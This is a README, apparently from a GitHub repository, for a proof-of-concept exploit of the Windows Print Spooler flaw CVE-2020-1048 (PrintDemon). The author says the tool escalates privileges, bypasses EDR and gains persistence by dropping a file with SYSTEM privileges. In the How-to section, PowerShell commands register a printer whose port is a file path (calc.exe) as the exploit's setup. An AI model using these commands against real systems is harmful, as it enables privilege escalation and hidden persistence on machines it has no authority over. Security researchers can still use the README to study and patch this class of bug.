# PrintDemon

(CVE-2020-1048)

PrintDemon is a vulnerability which uses the Windows Printer Spooler to escalate privileges, bypass Endpoint Detection and Response (EDR) and gain persistence. The Windows Printer Spooler has a long history of vulnerabilities including a vulnerability (CVE-2010-2729) used by the well-known Malware called Stuxnet back in 2010.

What the vulnerability does is printing bytes to a printer port which you set as a file. So the bytes gets printed to the file which you set as a port.
Yarden Shafir & Alex Ionescu created an awesome blog about the bug called PrintDemon, but when I tested the the PowerShell commands, it dropped a file, but with some markup trash in it. I decided to create a PowerShell script which creates a print job and executes when the spooler service is restarted. This way you can use this script to drop a file (base64 encoded) using system privileges.

# How-to

Run the following commands in PowerShell and use the executable to drop a file to the printer port location:

```
$printer = "PrintDemon"
$PrinterDriver = "Generic / Text Only"
$printerPort = "C:\Users\thalpius\Downloads\calc.exe"

Add-PrinterDriver -Name $PrinterDriver
Add-Printerport -name $printerPort
Add-Printer -Name $printer -DriverName $PrinterDriver -PortName $printerPort
```
